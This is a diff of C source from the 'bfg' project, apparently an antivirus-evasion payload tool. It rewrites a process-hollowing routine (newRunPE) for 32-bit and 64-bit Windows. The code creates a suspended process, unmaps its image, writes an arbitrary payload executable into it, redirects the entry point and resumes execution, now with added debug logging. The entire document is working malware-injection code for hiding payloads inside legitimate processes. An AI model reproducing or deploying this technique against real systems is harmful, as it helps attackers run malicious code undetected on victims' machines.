@@ -23,6 +23,7 @@ Web: https://github.com/govolution/bfg
 #include <string.h>
 #include <windows.h>
 #include <tchar.h>
+#include <winternl.h>
 #include "defs.h"
 #ifdef IMAGE
 #include <psapi.h>
@@ -355,148 +356,197 @@ DWORD get_pid_by_name(char *imgname)
 #endif
 
 #ifdef PROCESS_HOLLOWING
-void newRunPE(LPSTR szFilePath, PVOID pFile, LPTSTR commandLine) {
+void newRunPE(LPSTR targetPath, PVOID payloadData, LPTSTR commandLine) {
 	#ifndef X64
-		PIMAGE_DOS_HEADER IDH;				// DOS .EXE header
-		PIMAGE_NT_HEADERS INH;				// NT .EXE header
-		PIMAGE_SECTION_HEADER ISH;			// Section Header
-		PROCESS_INFORMATION PI;    			// Process Information
-		STARTUPINFOA SI;           			// Start Up Information
-		LPCONTEXT CTX;              		// Context Frame
-		PDWORD dwImageBase;        			// Source image base
-		NtUnmapViewOfSection xNtUnmapViewOfSection;
-		LPVOID pImageBase;					// Destination image base
-		PDWORD oldProtect;					// Old memory protection settings
-		int Count;
+		STARTUPINFOA targetStartupInfo;
+		PROCESS_INFORMATION targetProcessInfo;	
+		NtUnmapViewOfSection callNtUnmapViewOfSection;
+		PIMAGE_DOS_HEADER payloadDosHeader;
+		PIMAGE_NT_HEADERS payloadNtHeader;
+		PIMAGE_SECTION_HEADER payloadSectionHeader;
+		DWORD targetImageBase;
+		PCONTEXT targetContext;
 
-		IDH = (PIMAGE_DOS_HEADER) pFile;
+		// Init info structures for target process instanciation
+		RtlZeroMemory(&targetStartupInfo, sizeof(targetStartupInfo));
+		RtlZeroMemory(&targetProcessInfo, sizeof(targetProcessInfo));	
 
-		if (IDH->e_magic == IMAGE_DOS_SIGNATURE) {
-			INH = (PIMAGE_NT_HEADERS)(((DWORD) pFile) + IDH->e_lfanew);
-
-			// Patch payload subsystem to avoid crashes
-			INH->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
-
-			if (INH->Signature == IMAGE_NT_SIGNATURE) {
-				RtlZeroMemory(&SI, sizeof(SI));
-				RtlZeroMemory(&PI, sizeof(PI));				
-
-				// Create new instance of target process		
-				if (CreateProcessA(szFilePath, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
-					CTX = (LPCONTEXT) VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
-					CTX->ContextFlags = CONTEXT_FULL;
-
-					// Get image base of target process
-					if (GetThreadContext(PI.hThread, CTX)) {
-						ReadProcessMemory(PI.hProcess, (LPCVOID)(CTX->Ebx + (sizeof(SIZE_T) * 2)), (LPVOID)(&dwImageBase), sizeof(PVOID), NULL);
-
-						// Unmap old image
-						if (((DWORD)(dwImageBase)) == INH->OptionalHeader.ImageBase) {
-							xNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
-							xNtUnmapViewOfSection(PI.hProcess, (PVOID)(dwImageBase));
-						}
-
-						// Allocate new memory in target process for the payload
-						pImageBase = VirtualAllocEx(PI.hProcess, (LPVOID)(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-
-						if (pImageBase) {
-							// Write payload headers and sections into target process
-							WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
-
-							for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++) {
-								ISH = (PIMAGE_SECTION_HEADER)((DWORD)(pFile) + IDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (Count * sizeof(IMAGE_SECTION_HEADER)));
-								WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD)(pImageBase) + ISH->VirtualAddress), (LPVOID)((DWORD)(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
-							}
-
-							// Fix image base
-							WriteProcessMemory(PI.hProcess, (LPVOID)(CTX->Ebx + (sizeof(SIZE_T) * 2)), (LPVOID)(&INH->OptionalHeader.ImageBase), sizeof(PVOID), NULL);
-
-							// Fix memory protection after write to be more stealthy							
-							VirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, oldProtect);
-
-							// Set new entry point and resume target main thread
-							CTX->Eax = (DWORD)(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
-
-							// Set target thread context and resume main thread
-							SetThreadContext(PI.hThread, CTX);
-							ResumeThread(PI.hThread);							
-						}
-					}
-				}
-			}
+		// Create new instance of target process
+		if(!CreateProcessA(targetPath, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &targetStartupInfo, &targetProcessInfo)) {
+			printf("Failed to create target process.\n");
+			return;
+		} else {
+			printf("Target process instanciated.\n");
 		}
-		VirtualFree(pFile, 0, MEM_RELEASE);	
+
+		// Get thread context of target process
+		targetContext = (PCONTEXT) VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
+		if(targetContext == NULL) {
+			printf("Failed to allocate memory for target process context.\n");
+			return;
+		} else {
+			printf("Allocated memory for target process context.\n");
+		}
+		targetContext->ContextFlags = CONTEXT_FULL;
+		if(GetThreadContext(targetProcessInfo.hThread, (LPCONTEXT) targetContext) == 0) {
+			printf("GetThreadContext for target process main thread failed.\n");
+		} else {
+			printf("Retrieved target main thread context.\n");
+		}	
+
+		// Get payload headers
+		payloadDosHeader = (PIMAGE_DOS_HEADER) payloadData;
+		payloadNtHeader = (PIMAGE_NT_HEADERS) ((BYTE *) payloadDosHeader + payloadDosHeader->e_lfanew);	
+
+		// Patch payload subsystem to avoid crashes
+		payloadNtHeader->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;	
+
+		// Get target process image base
+		ReadProcessMemory(targetProcessInfo.hProcess, (LPCVOID) (targetContext->Ebx + 8), (LPVOID) (&targetImageBase), sizeof(DWORD), NULL);	
+		printf("Old target process image base is 0x%08X\n", targetImageBase);	
+
+		// Unmap old target process image
+		callNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
+		callNtUnmapViewOfSection(targetProcessInfo.hProcess, (PVOID) targetImageBase);
+		printf("Unmapped old target process image.\n");
+
+		// Allocate new memory in target process
+		targetImageBase = (DWORD) VirtualAllocEx(targetProcessInfo.hProcess, (LPVOID) payloadNtHeader->OptionalHeader.ImageBase, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+		if(targetImageBase == 0) {
+			printf("Failed to allocate new memory in target process.\n");
+			printf("Error code is 0x%x\n", GetLastError());
+			return;
+		} else {
+			printf("Allocated new memory in target process at 0x%08X. This is the new image base.\n");
+		}
+
+		// Write payload headers and sections into target memory
+		WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) targetImageBase, (LPCVOID) payloadData, payloadNtHeader->OptionalHeader.SizeOfHeaders, NULL);
+		printf("Wrote payload headers to target process.\n");
+
+		for (int i = 0; i < payloadNtHeader->FileHeader.NumberOfSections; i++) {
+			payloadSectionHeader = (PIMAGE_SECTION_HEADER) ((BYTE *) payloadData + payloadDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
+			WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) ((BYTE *) targetImageBase + payloadSectionHeader->VirtualAddress), (LPCVOID)((BYTE *) payloadData + payloadSectionHeader->PointerToRawData), payloadSectionHeader->SizeOfRawData, NULL);
+			printf("Wrote section %d to target process, section start address is 0x%08X\n", i, (BYTE *) targetImageBase + payloadSectionHeader->VirtualAddress);
+		}
+
+		// Write new target image base into target PEB
+		WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) (targetContext->Ebx + 8), (LPCVOID) &targetImageBase, sizeof(DWORD), NULL);
+		printf("Fixed target image base to 0x%08x\n", targetImageBase);
+
+		// Modify entry point to execute the copied payload
+		targetContext->Eax = targetImageBase + payloadNtHeader->OptionalHeader.AddressOfEntryPoint;
+		if(!SetThreadContext(targetProcessInfo.hThread, targetContext)) {
+			printf("Setting thread context for target main thread failed.\n");
+			return;
+		} else {
+			printf("Set thread context for target main thread.\n");
+		}
+
+		// Resume target main threads
+		if(ResumeThread(targetProcessInfo.hThread) == -1) {
+			printf("Failed to resume target main thread.\n");
+		} else {
+			printf("Resumed target main thread.\n");
+		}
 	#endif
 	
-	#ifdef X64
-		PIMAGE_DOS_HEADER IDH;				// DOS .EXE header
-		PIMAGE_NT_HEADERS INH;				// NT .EXE header
-		PIMAGE_SECTION_HEADER ISH;			// Section Header
-		PROCESS_INFORMATION PI;    			// Process Information
-		STARTUPINFOA SI;           			// Start Up Information
-		LPCONTEXT CTX;              		// Context Frame
-		PDWORD64 dwImageBase;        		// Source image base
-		NtUnmapViewOfSection xNtUnmapViewOfSection;
-		LPVOID pImageBase;					// Destination image base
-		PDWORD oldProtect;					// Old memory protection settings
-		int Count;
+	#ifdef X64		
+		STARTUPINFOA targetStartupInfo;
+		PROCESS_INFORMATION targetProcessInfo;	
+		NtUnmapViewOfSection callNtUnmapViewOfSection;
+		PIMAGE_DOS_HEADER payloadDosHeader;
+		PIMAGE_NT_HEADERS payloadNtHeader;
+		PIMAGE_SECTION_HEADER payloadSectionHeader;
+		DWORD64 targetImageBase;
+		PCONTEXT targetContext;
 
-		IDH = (PIMAGE_DOS_HEADER) pFile;
+		// Init info structures for target process instanciation
+		RtlZeroMemory(&targetStartupInfo, sizeof(targetStartupInfo));
+		RtlZeroMemory(&targetProcessInfo, sizeof(targetProcessInfo));	
 
-		if (IDH->e_magic == IMAGE_DOS_SIGNATURE) {
-			INH = (PIMAGE_NT_HEADERS)(((DWORD64) pFile) + IDH->e_lfanew);
-			
-			// Patch payload subsystem to avoid crashes
-			INH->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;
-			
-			if (INH->Signature == IMAGE_NT_SIGNATURE) {
-				RtlZeroMemory(&SI, sizeof(SI));
-				RtlZeroMemory(&PI, sizeof(PI));				
-			
-				// Create new instance of target process		
-				if (CreateProcessA(szFilePath, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI)) {
-					CTX = (LPCONTEXT) VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
-					CTX->ContextFlags = CONTEXT_FULL;
-					
-					// Get image base of target process
-					if (GetThreadContext(PI.hThread, CTX)) {
-						ReadProcessMemory(PI.hProcess, (PVOID)(CTX->Rdx + (sizeof(SIZE_T) * 2)), (LPVOID)(&dwImageBase), sizeof(PVOID), NULL);
-						
-						// Unmap old image
-						if (((DWORD64)(dwImageBase)) == INH->OptionalHeader.ImageBase) {
-							xNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
-							xNtUnmapViewOfSection(PI.hProcess, (PVOID)(dwImageBase));
-						}
-						
-						// Allocate new memory in target process for the payload
-						pImageBase = VirtualAllocEx(PI.hProcess, (LPVOID)(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-						
-						if (pImageBase) {
-							// Write payload headers and sections into target process
-							WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
-						
-							for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++) {
-								ISH = (PIMAGE_SECTION_HEADER)((DWORD64)(pFile) + IDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (Count * sizeof(IMAGE_SECTION_HEADER)));
-								WriteProcessMemory(PI.hProcess, (LPVOID)((DWORD64)(pImageBase) + ISH->VirtualAddress), (LPVOID)((DWORD64)(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
-							}
-							
-							// Fix image base
-							WriteProcessMemory(PI.hProcess, (LPVOID)(CTX->Rdx + (sizeof(SIZE_T) * 2)), (LPVOID)(&INH->OptionalHeader.ImageBase), sizeof(PVOID), NULL);
-							// Fix memory protection after write to be more stealthy							
-							VirtualProtectEx(PI.hProcess, pImageBase, INH->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, oldProtect);
-							// Set new entry point and resume target main thread
-							CTX->Rcx = (DWORD64)(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
-							
-							// Set target thread context and resume main thread
-							SetThreadContext(PI.hThread, CTX);
-							ResumeThread(PI.hThread);							
-						}
-					}
-				}
-			}
+		// Create new instance of target process
+		if(!CreateProcessA(targetPath, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &targetStartupInfo, &targetProcessInfo)) {
+			printf("Failed to create target process.\n");
+			return;
+		} else {
+			printf("Target process instanciated.\n");
 		}
-		VirtualFree(pFile, 0, MEM_RELEASE);	
-	#endif	
+
+		// Get thread context of target process
+		targetContext = (PCONTEXT) VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
+		if(targetContext == NULL) {
+			printf("Failed to allocate memory for target process context.\n");
+			return;
+		} else {
+			printf("Allocated memory for target process context.\n");
+		}
+		targetContext->ContextFlags = CONTEXT_FULL;
+		if(GetThreadContext(targetProcessInfo.hThread, (LPCONTEXT) targetContext) == 0) {
+			printf("GetThreadContext for target process main thread failed.\n");
+		} else {
+			printf("Retrieved target main thread context.\n");
+		}	
+
+		// Get payload headers
+		payloadDosHeader = (PIMAGE_DOS_HEADER) payloadData;
+		payloadNtHeader = (PIMAGE_NT_HEADERS) ((BYTE *) payloadDosHeader + payloadDosHeader->e_lfanew);	
+
+		// Patch payload subsystem to avoid crashes
+		payloadNtHeader->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;	
+
+		// Get target process image base
+		ReadProcessMemory(targetProcessInfo.hProcess, (LPCVOID) (targetContext->Rdx + 16), (LPVOID) (&targetImageBase), sizeof(PVOID), NULL);		
+		printf("Desired image base is:   0x%16X\n", payloadNtHeader->OptionalHeader.ImageBase);	
+		printf("Actual target process image base is 0x%08X\n", targetImageBase);	
+
+		// Unmap old target process image
+		callNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
+		callNtUnmapViewOfSection(targetProcessInfo.hProcess, (PVOID) targetImageBase);
+		printf("Unmapped old target process image.\n");
+
+		// Allocate new memory in target process
+		targetImageBase = (DWORD64) VirtualAllocEx(targetProcessInfo.hProcess, (LPVOID) payloadNtHeader->OptionalHeader.ImageBase, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+		if(targetImageBase == 0) {
+			printf("Failed to allocate new memory in target process.\n");
+			printf("Error code is 0x%x\n", GetLastError());
+			return;
+		} else {
+			printf("Allocated new memory in target process at 0x%08X. This is the new image base.\n");
+		}
+
+		// Write payload headers and sections into target memory
+		WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) targetImageBase, (LPCVOID) payloadData, payloadNtHeader->OptionalHeader.SizeOfHeaders, NULL);
+		printf("Wrote payload headers to target process.\n");
+
+		for (int i = 0; i < payloadNtHeader->FileHeader.NumberOfSections; i++) {
+			payloadSectionHeader = (PIMAGE_SECTION_HEADER) ((BYTE *) payloadData + payloadDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
+			WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) ((BYTE *) targetImageBase + payloadSectionHeader->VirtualAddress), (LPCVOID)((BYTE *) payloadData + payloadSectionHeader->PointerToRawData), payloadSectionHeader->SizeOfRawData, NULL);
+			printf("Wrote section %d to target process, section start address is 0x%08X\n", i, (BYTE *) targetImageBase + payloadSectionHeader->VirtualAddress);
+		}
+
+		// Write new target image base into target PEB
+		WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) (targetContext->Rdx + 16), (LPCVOID) &targetImageBase, sizeof(PVOID), NULL);
+		printf("Fixed target image base to 0x%08x\n", targetImageBase);
+
+		// Modify entry point to execute the copied payload
+		targetContext->Rcx = targetImageBase + payloadNtHeader->OptionalHeader.AddressOfEntryPoint;
+		if(!SetThreadContext(targetProcessInfo.hThread, targetContext)) {
+			printf("Setting thread context for target main thread failed.\n");
+			return;
+		} else {
+			printf("Set thread context for target main thread.\n");
+		}
+
+		// Resume target main threads
+		if(ResumeThread(targetProcessInfo.hThread) == -1) {
+			printf("Failed to resume target main thread.\n");
+		} else {
+			printf("Resumed target main thread.\n");
+		}	
+	#endif
 }
 #endif
 
